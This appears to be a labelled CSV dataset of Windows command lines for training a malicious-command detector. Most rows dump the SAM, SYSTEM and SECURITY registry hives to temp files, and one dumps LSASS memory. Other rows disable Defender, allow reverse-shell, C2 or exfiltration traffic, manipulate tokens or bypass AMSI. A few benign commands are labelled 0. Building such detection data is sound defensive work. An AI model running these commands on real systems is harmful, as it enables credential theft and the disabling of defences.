text,label
reg save hklm\system c:\windows\temp\184yaa0i.save,1
reg export hklm\sam c:\windows\temp\d6axl7xj.save,1
reg save hklm\system c:\windows\temp\shdd89qg.save,1
reg export hklm\security c:\windows\temp\u95u0maq.save,1
reg export hklm\system c:\windows\temp\9l1tner8.save,1
reg save hklm\system c:\windows\temp\j8f00se3.save,1
"powershell -nop -c ""set-mppreference   -disablerealtimemonitoring   $true""",2
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\obbzni2o.save""",1
reg export hklm\sam c:\windows\temp\6hgdfup9.save,1
reg export hklm\system c:\windows\temp\hcbnohj6.save,1
reg export hklm\system c:\windows\temp\3k5p913y.save,1
reg save hklm\sam c:\windows\temp\aixzbv1a.save,1
reg export hklm\system c:\windows\temp\swlhe9mu.save,1
reg save hklm\security c:\windows\temp\0vfj2oxd.save,1
reg export hklm\sam c:\windows\temp\yah1n88l.save,1
reg save hklm\system c:\windows\temp\l05fnm2b.save,1
reg export hklm\system c:\windows\temp\lld37jmh.save,1
reg save hklm\system c:\windows\temp\2ey59xo8.save,1
reg save hklm\system c:\windows\temp\zw8rvnhw.save,1
reg export hklm\security c:\windows\temp\3e8d7knw.save,1
reg save hklm\sam c:\windows\temp\tu7de8u4.save,1
reg export hklm\system c:\windows\temp\7g5844l3.save,1
reg export hklm\system c:\windows\temp\mllmkgbu.save,1
reg export hklm\sam c:\windows\temp\8f9ege73.save,1
reg   save   hklm\system   c:\windows\temp\9krv1l8h.save,1
reg save hklm\system c:\windows\temp\5nkwrowq.save,1
reg save hklm\sam c:\windows\temp\c9zqfaxd.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\e8p05yy6.save""",1
reg export hklm\sam c:\windows\temp\h11arj1x.save,1
reg save hklm\sam c:\windows\temp\yh8yxs55.save,1
reg save hklm\sam c:\windows\temp\mmduv9fy.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\ycg2rvwi.save""",1
reg export hklm\sam c:\windows\temp\6z1sakqy.save,1
reg export hklm\security c:\windows\temp\ldkqwf1z.save,1
reg save hklm\security c:\windows\temp\0obcstq1.save,1
reg export hklm\security c:\windows\temp\12zanznq.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\security c:\windows\temp\1hg1xn07.save,1
reg export hklm\security c:\windows\temp\io3v311n.save,1
reg export hklm\system c:\windows\temp\f5ay1et1.save,1
"cmd.exe /c ""node server.js --port 3000""",0
reg export hklm\security c:\windows\temp\kxafrot9.save,1
reg export hklm\system c:\windows\temp\jwdtoulp.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\40vz1rn8.save""",1
reg save hklm\sam c:\windows\temp\ed1et49a.save,1
reg export hklm\sam c:\windows\temp\4swdxfgt.save,1
reg export hklm\security c:\windows\temp\j9pzf8zn.save,1
reg export hklm\system c:\windows\temp\kvthv8kc.save,1
reg save hklm\security c:\windows\temp\2tywdvzo.save,1
reg export hklm\security c:\windows\temp\0gaaazo8.save,1
reg save hklm\security c:\windows\temp\czn1xvm8.save,1
reg save hklm\system c:\windows\temp\33c8kfjg.save,1
reg export hklm\security c:\windows\temp\9rrwykoc.save,1
reg export hklm\sam c:\windows\temp\d2qmp4hq.save,1
reg export hklm\sam c:\windows\temp\bol57yur.save,1
reg save hklm\sam c:\windows\temp\7lp6720d.save,1
reg save hklm\system c:\windows\temp\dkrro0x5.save,1
reg export hklm\sam c:\windows\temp\wg2eehnm.save,1
reg export hklm\sam c:\windows\temp\lnwgogtx.save,1
reg export hklm\sam c:\windows\temp\vpto0h93.save,1
reg export hklm\sam c:\windows\temp\nepjeg6c.save,1
reg save hklm\system c:\windows\temp\d8xdvz84.save,1
reg save hklm\security c:\windows\temp\c50vlbt0.save,1
reg export hklm\sam c:\windows\temp\6gnt3235.save,1
rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg   export   hklm\system   c:\windows\temp\q9trxykk.save,1
reg save hklm\security c:\windows\temp\vniejcis.save,1
reg export hklm\sam c:\windows\temp\twxgj4q3.save,1
reg save hklm\security c:\windows\temp\tqh98t67.save,1
reg export hklm\security c:\windows\temp\15atbw8z.save,1
reg save hklm\sam c:\windows\temp\v22pctzf.save,1
reg export hklm\security c:\windows\temp\zqmrg56y.save,1
reg export hklm\system c:\windows\temp\avp8qv0u.save,1
reg save hklm\system c:\windows\temp\osxtdaqk.save,1
reg export hklm\system c:\windows\temp\7tjk4ea8.save,1
reg save hklm\system c:\windows\temp\88emxxdp.save,1
"powershell -nop -c ""klist   get   krbtgt/domain.local""",3
reg  export  hklm\sam  c:\windows\temp\474jigj5.save,1
reg export hklm\system c:\windows\temp\9usp5kpj.save,1
reg save hklm\sam c:\windows\temp\35udb1lh.save,1
reg save hklm\system c:\windows\temp\990m4n6y.save,1
reg export hklm\security c:\windows\temp\i8g29v48.save,1
reg export hklm\system c:\windows\temp\yq3s5qdt.save,1
reg export hklm\sam c:\windows\temp\5ymxprzn.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\2jazjzsg.save""",1
reg save hklm\sam c:\windows\temp\3zdqn264.save,1
reg export hklm\security c:\windows\temp\7tzx9ax7.save,1
reg save hklm\security c:\windows\temp\8ktlg4u6.save,1
reg save hklm\security c:\windows\temp\j7tolsiz.save,1
reg save hklm\system c:\windows\temp\hk9ig38y.save,1
reg export hklm\security c:\windows\temp\jh2fw6xg.save,1
reg save hklm\sam c:\windows\temp\4rnx5bhh.save,1
reg export hklm\system c:\windows\temp\88h871t6.save,1
reg export hklm\security c:\windows\temp\s7w3nltr.save,1
reg export hklm\system c:\windows\temp\qk6w510s.save,1
reg save hklm\system c:\windows\temp\kdgtvma6.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\tv8pywu5.save""",1
reg save hklm\security c:\windows\temp\zrd19xwi.save,1
reg save hklm\system c:\windows\temp\owpq23t6.save,1
reg export hklm\security c:\windows\temp\u3lhdtms.save,1
reg save hklm\security c:\windows\temp\ddyvqtmh.save,1
reg export hklm\security c:\windows\temp\sjq5j9u3.save,1
reg save hklm\system c:\windows\temp\pnfhf8qm.save,1
reg save hklm\sam c:\windows\temp\15267it2.save,1
reg export hklm\system c:\windows\temp\rkc6zduu.save,1
reg save hklm\sam c:\windows\temp\09yjrkud.save,1
reg save hklm\security c:\windows\temp\73egqswl.save,1
reg save hklm\sam c:\windows\temp\b03oe5vh.save,1
reg save hklm\system c:\windows\temp\c928mk2j.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\sam c:\windows\temp\bxz27lhy.save,1
reg save hklm\system c:\windows\temp\44fhtikv.save,1
reg export hklm\system c:\windows\temp\ohbduobi.save,1
reg export hklm\system c:\windows\temp\kttiq703.save,1
reg save hklm\sam c:\windows\temp\nlstspgo.save,1
klist  purge,3
reg save hklm\system c:\windows\temp\fgepcv34.save,1
reg export hklm\sam c:\windows\temp\6s7lygt0.save,1
reg save hklm\security c:\windows\temp\n2dse1e1.save,1
reg export hklm\system c:\windows\temp\04td83qk.save,1
reg save hklm\security c:\windows\temp\e3wgw49a.save,1
reg export hklm\security c:\windows\temp\wri9fkkx.save,1
reg save hklm\system c:\windows\temp\qf3928fb.save,1
reg save hklm\sam c:\windows\temp\b39cjt8j.save,1
reg save hklm\system c:\windows\temp\0sbdvgqm.save,1
reg save hklm\system c:\windows\temp\ry3vqwxw.save,1
reg save hklm\sam c:\windows\temp\3iroakhl.save,1
reg export hklm\system c:\windows\temp\v0zu7od5.save,1
reg export hklm\security c:\windows\temp\fmp4jndq.save,1
reg export hklm\security c:\windows\temp\22dfaa03.save,1
reg save hklm\system c:\windows\temp\h6upquki.save,1
reg save hklm\sam c:\windows\temp\0vfveang.save,1
reg save hklm\system c:\windows\temp\5wn1pu2h.save,1
reg save hklm\sam c:\windows\temp\nl7meviw.save,1
reg save hklm\security c:\windows\temp\tq6qyig8.save,1
reg export hklm\security c:\windows\temp\kqjlrmkq.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\9347fkvw.save""",1
reg export hklm\sam c:\windows\temp\v34yr29d.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\security c:\windows\temp\4juhm5l3.save,1
reg export hklm\security c:\windows\temp\lj9h1o1m.save,1
reg save hklm\sam c:\windows\temp\1kesodw5.save,1
reg export hklm\system c:\windows\temp\ieq55mj1.save,1
reg save hklm\system c:\windows\temp\8yamembf.save,1
reg save hklm\security c:\windows\temp\jr7bgepe.save,1
reg export hklm\system c:\windows\temp\7rq1t2f2.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\security c:\windows\temp\n374x3lq.save,1
reg export hklm\security c:\windows\temp\29bv312l.save,1
reg export hklm\sam c:\windows\temp\z1w9hyeu.save,1
reg save hklm\system c:\windows\temp\yrhqe7up.save,1
reg export hklm\sam c:\windows\temp\mu3mcb08.save,1
"powershell -nop -c ""python  -m  http.server  8080""",0
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
"rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full",1
reg export hklm\security c:\windows\temp\7ucl2k7g.save,1
reg save hklm\system c:\windows\temp\bt8b6e06.save,1
"powershell -nop -c ""ipconfig  /all""",0
reg save hklm\sam c:\windows\temp\0tb06xrg.save,1
reg export hklm\system c:\windows\temp\xi9g5bcw.save,1
reg export hklm\sam c:\windows\temp\zbocduh7.save,1
reg save hklm\security c:\windows\temp\nbp7edj5.save,1
reg save hklm\sam c:\windows\temp\qdrxdx2m.save,1
reg   save   hklm\system   c:\windows\temp\65mw7nme.save,1
reg save hklm\security c:\windows\temp\dw3bgund.save,1
reg save hklm\system c:\windows\temp\do387key.save,1
reg export hklm\sam c:\windows\temp\2dl6zbi4.save,1
reg save hklm\system c:\windows\temp\1xxj8up0.save,1
reg export hklm\sam c:\windows\temp\zn0u8f5e.save,1
reg export hklm\security c:\windows\temp\ehyhbgiu.save,1
reg  save  hklm\security  c:\windows\temp\8woyeqjq.save,1
reg   save   hklm\sam   c:\windows\temp\pcekslfd.save,1
reg save hklm\sam c:\windows\temp\quyqc9u7.save,1
reg save hklm\security c:\windows\temp\li1ky1y5.save,1
reg save hklm\sam c:\windows\temp\fw9z4gky.save,1
reg export hklm\system c:\windows\temp\5943rvsg.save,1
reg save hklm\system c:\windows\temp\x9z7ntst.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\rlok75ni.save""",1
reg save hklm\sam c:\windows\temp\4r4eiuyy.save,1
reg export hklm\security c:\windows\temp\kcm7ug0g.save,1
$a = [ref].assembly.gettype('system.management.automation.impersonateloggedonuser'),3
reg export hklm\security c:\windows\temp\ao7ieyoq.save,1
reg save hklm\security c:\windows\temp\ybm9qc0c.save,1
reg save hklm\system c:\windows\temp\ymfjhvt8.save,1
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg save hklm\security c:\windows\temp\knli06z6.save,1
reg   export   hklm\system   c:\windows\temp\a3t7ux2j.save,1
reg save hklm\security c:\windows\temp\3guw7whw.save,1
reg save hklm\sam c:\windows\temp\ar0yx0n0.save,1
reg  save  hklm\system  c:\windows\temp\di5w1396.save,1
reg save hklm\security c:\windows\temp\13y9ft73.save,1
ipconfig /all,0
reg save hklm\sam c:\windows\temp\vjzhf6b3.save,1
reg save hklm\security c:\windows\temp\w8jebyrn.save,1
"powershell -nop -c ""sc query windefend""",0
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\ofuo1rqi.save""",1
reg save hklm\sam c:\windows\temp\9dk5fsms.save,1
reg export hklm\system c:\windows\temp\9g9yychv.save,1
reg   save   hklm\sam   c:\windows\temp\i1981jpr.save,1
reg save hklm\security c:\windows\temp\nf5o463r.save,1
reg export hklm\system c:\windows\temp\elhk21nw.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\sam c:\windows\temp\ajwofhxh.save,1
reg   export   hklm\system   c:\windows\temp\lfs4osua.save,1
reg save hklm\sam c:\windows\temp\ydrhf3ve.save,1
reg save hklm\system c:\windows\temp\9p2p2unh.save,1
reg export hklm\system c:\windows\temp\wdpv5pa5.save,1
reg export hklm\security c:\windows\temp\enbodfwo.save,1
reg export hklm\system c:\windows\temp\byfh9sb6.save,1
reg save hklm\system c:\windows\temp\qd3h97r1.save,1
reg export hklm\system c:\windows\temp\7z57287c.save,1
reg save hklm\system c:\windows\temp\y1077hn2.save,1
reg export hklm\system c:\windows\temp\64kcs3ia.save,1
reg save hklm\sam c:\windows\temp\lvfedbmg.save,1
"powershell -nop -c ""set-mppreference -disablerealtimemonitoring $true""",2
reg save hklm\security c:\windows\temp\1yaohjtq.save,1
reg export hklm\sam c:\windows\temp\5elgpdk2.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\fcuyetst.save""",1
reg save hklm\security c:\windows\temp\66equ30d.save,1
reg save hklm\sam c:\windows\temp\9kviyeal.save,1
reg export hklm\sam c:\windows\temp\10p2y87r.save,1
reg save hklm\system c:\windows\temp\s7pnbjn5.save,1
reg save hklm\sam c:\windows\temp\lyxzzdrt.save,1
reg save hklm\system c:\windows\temp\3vu431af.save,1
reg export hklm\sam c:\windows\temp\ulku4k0d.save,1
reg export hklm\system c:\windows\temp\iqf9iohz.save,1
reg save hklm\security c:\windows\temp\h7j00sjd.save,1
reg export hklm\security c:\windows\temp\129s5r2l.save,1
reg save hklm\sam c:\windows\temp\cys8jc0f.save,1
reg save hklm\system c:\windows\temp\lqq7n6r8.save,1
reg save hklm\sam c:\windows\temp\6blqbzzi.save,1
reg export hklm\sam c:\windows\temp\nc5c7s8e.save,1
reg save hklm\sam c:\windows\temp\72dn7h0h.save,1
reg save hklm\security c:\windows\temp\c9ut7ljf.save,1
reg save hklm\system c:\windows\temp\jvhhbvg6.save,1
"[dllimport(""advapi32.dll"")]   extern   bool   duplicatetokenex(...)",3
reg export hklm\sam c:\windows\temp\uaufqof1.save,1
reg export hklm\security c:\windows\temp\z0z93viv.save,1
reg export hklm\security c:\windows\temp\s60fjkpf.save,1
reg export hklm\security c:\windows\temp\ys4bl6vx.save,1
reg export hklm\sam c:\windows\temp\zrtzhbw7.save,1
reg export hklm\system c:\windows\temp\8bwujvxr.save,1
reg export hklm\security c:\windows\temp\n1ff62bt.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\didhy1dc.save""",1
reg save hklm\sam c:\windows\temp\srlu7kgh.save,1
reg export hklm\sam c:\windows\temp\ll02xsrk.save,1
"powershell -nop -c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
reg export hklm\security c:\windows\temp\41sttrvt.save,1
reg save hklm\sam c:\windows\temp\xtawocii.save,1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg save hklm\security c:\windows\temp\f70posar.save,1
reg export hklm\security c:\windows\temp\ditotuav.save,1
reg save hklm\security c:\windows\temp\to3rz9se.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\oeoexq9s.save""",1
reg export hklm\sam c:\windows\temp\xj81qt5p.save,1
reg export hklm\sam c:\windows\temp\lgl06j7v.save,1
reg export hklm\system c:\windows\temp\dy3utrwz.save,1
reg export hklm\sam c:\windows\temp\crfeb91x.save,1
reg save hklm\sam c:\windows\temp\jv6qu7b4.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\xkqxnwiu.save""",1
reg export hklm\system c:\windows\temp\p9u8eb9h.save,1
reg export hklm\system c:\windows\temp\f6w877o5.save,1
"powershell -nop -c ""klist   purge""",3
reg save hklm\system c:\windows\temp\07vcij6t.save,1
reg export hklm\sam c:\windows\temp\bum6aiwf.save,1
reg save hklm\system c:\windows\temp\5x5t11vi.save,1
reg export hklm\security c:\windows\temp\6dk8yrdw.save,1
reg save hklm\system c:\windows\temp\g8ngxqup.save,1
reg save hklm\sam c:\windows\temp\km6wp6jk.save,1
reg export hklm\sam c:\windows\temp\7xkk807k.save,1
reg export hklm\security c:\windows\temp\3dljutob.save,1
reg export hklm\system c:\windows\temp\z7xn8132.save,1
reg export hklm\system c:\windows\temp\b8ptzl9n.save,1
reg save hklm\system c:\windows\temp\bp1irctf.save,1
reg save hklm\security c:\windows\temp\hnj0s9n3.save,1
reg save hklm\sam c:\windows\temp\ogh8yfzk.save,1
reg export hklm\system c:\windows\temp\d6770fsx.save,1
reg save hklm\sam c:\windows\temp\28n08s62.save,1
reg export hklm\security c:\windows\temp\r3rhsteq.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\q305xram.save""",1
reg save hklm\system c:\windows\temp\1rp0ap59.save,1
"powershell -nop -c ""get-help   adjusttokenprivileges   -full""",0
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg save hklm\system c:\windows\temp\b7vf3emj.save,1
reg export hklm\security c:\windows\temp\fehel60t.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\y66bpafs.save""",1
reg save hklm\system c:\windows\temp\ge7buhnk.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg save hklm\security c:\windows\temp\kkuppr9e.save,1
reg export hklm\system c:\windows\temp\c7a4ai1e.save,1
reg export hklm\sam c:\windows\temp\gr78u4eg.save,1
reg export hklm\security c:\windows\temp\pur3f275.save,1
reg export hklm\sam c:\windows\temp\nsiamgiv.save,1
reg export hklm\sam c:\windows\temp\788h9kxx.save,1
reg save hklm\sam c:\windows\temp\h3ctfzbm.save,1
reg export hklm\security c:\windows\temp\hfcgd83g.save,1
reg export hklm\security c:\windows\temp\ckj9f7wg.save,1
reg export hklm\sam c:\windows\temp\odpx7psh.save,1
reg save hklm\security c:\windows\temp\bwmtjajr.save,1
reg export hklm\system c:\windows\temp\aredhqy5.save,1
reg save hklm\sam c:\windows\temp\69rlznyh.save,1
reg save hklm\security c:\windows\temp\w3ri1xlj.save,1
reg export hklm\security c:\windows\temp\5mx8uqfh.save,1
reg export hklm\sam c:\windows\temp\uspt6qt3.save,1
reg export hklm\sam c:\windows\temp\hp1vym1x.save,1
reg save hklm\security c:\windows\temp\ebdf2l82.save,1
reg save hklm\sam c:\windows\temp\fh2vdgez.save,1
reg save hklm\security c:\windows\temp\onywxzqm.save,1
reg export hklm\security c:\windows\temp\wgqvyju4.save,1
reg save hklm\system c:\windows\temp\mk8s7q72.save,1
reg save hklm\system c:\windows\temp\xg6ssmne.save,1
reg save hklm\system c:\windows\temp\byhv9bup.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\system c:\windows\temp\fxfg129m.save,1
reg export hklm\system c:\windows\temp\h78sl0jw.save,1
reg save hklm\security c:\windows\temp\r0grdw9a.save,1
reg   export   hklm\sam   c:\windows\temp\nwh1zsvw.save,1
reg export hklm\sam c:\windows\temp\hfrzd8mw.save,1
reg export hklm\sam c:\windows\temp\sovhxfoz.save,1
reg export hklm\system c:\windows\temp\ap49km0h.save,1
reg save hklm\system c:\windows\temp\y90jatpd.save,1
reg export hklm\sam c:\windows\temp\lgjvdcni.save,1
reg export hklm\system c:\windows\temp\bbj4idpz.save,1
reg save hklm\security c:\windows\temp\jxq8ylyv.save,1
reg export hklm\sam c:\windows\temp\x2gopkiy.save,1
reg save hklm\system c:\windows\temp\7rm4462i.save,1
reg export hklm\security c:\windows\temp\p3al40al.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\2woie871.save""",1
reg save hklm\system c:\windows\temp\q8l7sqf4.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\system c:\windows\temp\xqb5da35.save,1
reg  export  hklm\security  c:\windows\temp\uak55duy.save,1
reg save hklm\sam c:\windows\temp\kqfzner3.save,1
reg export hklm\system c:\windows\temp\o41n6pgd.save,1
reg export hklm\sam c:\windows\temp\lwog7str.save,1
reg save hklm\sam c:\windows\temp\hx0x5cyx.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\security c:\windows\temp\kb3x4bly.save,1
reg export hklm\sam c:\windows\temp\7yhh5wyd.save,1
"powershell -nop -c ""systeminfo""",0
reg save hklm\system c:\windows\temp\tyyvxf1w.save,1
reg save hklm\system c:\windows\temp\jlusxfl5.save,1
reg save hklm\security c:\windows\temp\5wz8y4p2.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg save hklm\system c:\windows\temp\zeu65s4y.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\sam c:\windows\temp\yssb2m4d.save,1
reg save hklm\system c:\windows\temp\vr7e02if.save,1
reg save hklm\security c:\windows\temp\jzydrqwm.save,1
reg export hklm\security c:\windows\temp\juzwgv77.save,1
reg save hklm\sam c:\windows\temp\8z9kr8mb.save,1
reg save hklm\sam c:\windows\temp\3nw99723.save,1
reg save hklm\sam c:\windows\temp\3eq4fefo.save,1
reg save hklm\system c:\windows\temp\lmgagw4m.save,1
"cmd.exe /c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\system c:\windows\temp\8xicv0pl.save,1
reg   save   hklm\sam   c:\windows\temp\m97mpawm.save,1
reg export hklm\system c:\windows\temp\bovhndf7.save,1
reg export hklm\sam c:\windows\temp\4wp9zs6x.save,1
reg save hklm\system c:\windows\temp\ih9uqt9b.save,1
reg save hklm\sam c:\windows\temp\pdiyq7wz.save,1
reg save hklm\sam c:\windows\temp\y4tgmvwg.save,1
reg save hklm\sam c:\windows\temp\dt6sq1cz.save,1
reg save hklm\sam c:\windows\temp\4kfbko9q.save,1
reg save hklm\system c:\windows\temp\981ef4xk.save,1
reg export hklm\security c:\windows\temp\8oto7t08.save,1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\system c:\windows\temp\ifkqh6ga.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\61dpwaon.save""",1
reg export hklm\sam c:\windows\temp\7yw8t7vv.save,1
reg save hklm\system c:\windows\temp\f2rxstp6.save,1
reg save hklm\system c:\windows\temp\iov58z9t.save,1
reg export hklm\system c:\windows\temp\b4o539gj.save,1
reg export hklm\system c:\windows\temp\76gtr93s.save,1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337""",2
reg save hklm\sam c:\windows\temp\khydjdk3.save,1
reg   export   hklm\system   c:\windows\temp\vbteq3d2.save,1
reg export hklm\sam c:\windows\temp\h5wcslnq.save,1
reg save hklm\sam c:\windows\temp\83dhmjeo.save,1
reg save hklm\sam c:\windows\temp\tnu57egl.save,1
reg export hklm\security c:\windows\temp\h2xlkbfx.save,1
reg save hklm\security c:\windows\temp\8ogcm8x8.save,1
reg export hklm\system c:\windows\temp\1yqo137j.save,1
reg   save   hklm\sam   c:\windows\temp\k6uw6e3k.save,1
reg save hklm\sam c:\windows\temp\f13zafyp.save,1
reg export hklm\security c:\windows\temp\171nzu1n.save,1
reg export hklm\system c:\windows\temp\s8ugylbx.save,1
reg save hklm\system c:\windows\temp\pb14lgut.save,1
reg save hklm\security c:\windows\temp\m6uur9vh.save,1
reg export hklm\sam c:\windows\temp\u6st7n3n.save,1
reg save hklm\sam c:\windows\temp\6empqcik.save,1
reg export hklm\sam c:\windows\temp\rwfwhbdx.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\5nb8wcsz.save""",1
reg save hklm\system c:\windows\temp\k1n7hggm.save,1
reg export hklm\sam c:\windows\temp\wry20l6c.save,1
reg export hklm\sam c:\windows\temp\8699u1i8.save,1
reg save hklm\sam c:\windows\temp\c1fpw2f8.save,1
reg save hklm\system c:\windows\temp\7zh0alp4.save,1
reg save hklm\security c:\windows\temp\j59b25e6.save,1
reg export hklm\security c:\windows\temp\fn43j92j.save,1
reg export hklm\security c:\windows\temp\bhlxbtin.save,1
reg export hklm\sam c:\windows\temp\6fqd0jnq.save,1
reg export hklm\system c:\windows\temp\0npihutt.save,1
reg export hklm\system c:\windows\temp\3d8ox7ck.save,1
reg save hklm\security c:\windows\temp\wulzfiai.save,1
reg   save   hklm\system   c:\windows\temp\hz6x1oaz.save,1
reg save hklm\sam c:\windows\temp\6irkbjvv.save,1
reg export hklm\sam c:\windows\temp\y12lrh2v.save,1
reg export hklm\sam c:\windows\temp\65d55dak.save,1
reg export hklm\security c:\windows\temp\u6xjgic0.save,1
reg export hklm\system c:\windows\temp\97zhu43j.save,1
reg export hklm\system c:\windows\temp\z97mgywq.save,1
reg save hklm\system c:\windows\temp\83q13gjs.save,1
reg export hklm\security c:\windows\temp\ye17i5kk.save,1
reg save hklm\sam c:\windows\temp\2gz0plxc.save,1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 1337""",2
reg save hklm\system c:\windows\temp\tl88ub4p.save,1
reg export hklm\sam c:\windows\temp\gyj3a6sj.save,1
reg export hklm\sam c:\windows\temp\4wd564ov.save,1
reg save hklm\system c:\windows\temp\pl4vzo2i.save,1
reg export hklm\security c:\windows\temp\6g9rmjmf.save,1
reg save hklm\system c:\windows\temp\trshbhbp.save,1
reg  save  hklm\sam  c:\windows\temp\5rftcxtf.save,1
reg save hklm\sam c:\windows\temp\l2pztp7f.save,1
reg save hklm\system c:\windows\temp\sfcipbyn.save,1
reg save hklm\system c:\windows\temp\xbhhs2tm.save,1
reg save hklm\sam c:\windows\temp\am2z3r6a.save,1
reg export hklm\security c:\windows\temp\jp2y5qhe.save,1
rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888,2
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\kyeo8oat.save""",1
reg save hklm\security c:\windows\temp\5o81xw19.save,1
"cmd.exe /c ""sc  query  windefend""",0
reg save hklm\system c:\windows\temp\5hyvzji1.save,1
reg   export   hklm\sam   c:\windows\temp\59b3udtx.save,1
reg export hklm\security c:\windows\temp\guof9n1q.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\gnrirqsu.save""",1
reg export hklm\security c:\windows\temp\kyki25z5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\s.dat""",1
reg export hklm\security c:\windows\temp\i510pfba.save,1
reg save hklm\system c:\windows\temp\mp80qw8u.save,1
reg save hklm\system c:\windows\temp\uoceiva7.save,1
reg save hklm\security c:\windows\temp\zl6055a9.save,1
reg save hklm\system c:\windows\temp\w98ck53x.save,1
reg save hklm\system c:\windows\temp\46k00wey.save,1
reg export hklm\security c:\windows\temp\jl7lly08.save,1
reg export hklm\sam c:\windows\temp\pddf7jbv.save,1
reg export hklm\system c:\windows\temp\xpcp226c.save,1
